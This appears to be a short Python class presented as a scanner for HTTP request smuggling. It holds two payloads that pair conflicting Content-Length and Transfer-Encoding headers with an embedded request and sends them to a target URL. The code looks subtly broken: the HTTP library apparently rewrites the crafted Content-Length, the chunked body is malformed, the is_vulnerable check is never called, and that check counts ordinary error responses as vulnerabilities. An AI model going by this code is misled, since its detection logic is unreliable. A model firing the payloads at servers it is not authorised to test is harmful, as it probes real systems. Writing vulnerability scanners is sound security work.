import requests

class HTTPRequestSmuggler:
    """
    Detects HTTP Request Smuggling vulnerabilities by sending
    specially crafted overlapping requests and analyzing responses.
    """
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.payloads = [
            {"header": "Content-Length: 13\r\nTransfer-Encoding: chunked\r\n", "body": "GET / HTTP/1.1\r\n\r\n"},
            {"header": "Transfer-Encoding: chunked\r\nContent-Length: 0\r\n", "body": "POST / HTTP/1.1\r\n\r\n"}
        ]

    def test_payloads(self):
        results = []
        for payload in self.payloads:
            try:
                headers = {"Content-Type": "application/http", **dict([line.split(": ") for line in payload["header"].split("\r\n") if line])}
                response = requests.post(self.target_url, data=payload["body"], headers=headers, timeout=self.timeout)
                results.append({
                    "header": payload["header"],
                    "body": payload["body"],
                    "status": response.status_code,
                    "content_snippet": response.text[:200]
                })
            except requests.exceptions.RequestException as e:
                results.append({"header": payload["header"], "error": str(e)})
        return results

    def is_vulnerable(self, response_snippet: str) -> bool:
        # Heuristic: unusual server responses, errors, or content-length discrepancies
        suspicious_keywords = ["400 Bad Request", "502", "internal server error"]
        return any(k.lower() in response_snippet.lower() for k in suspicious_keywords)
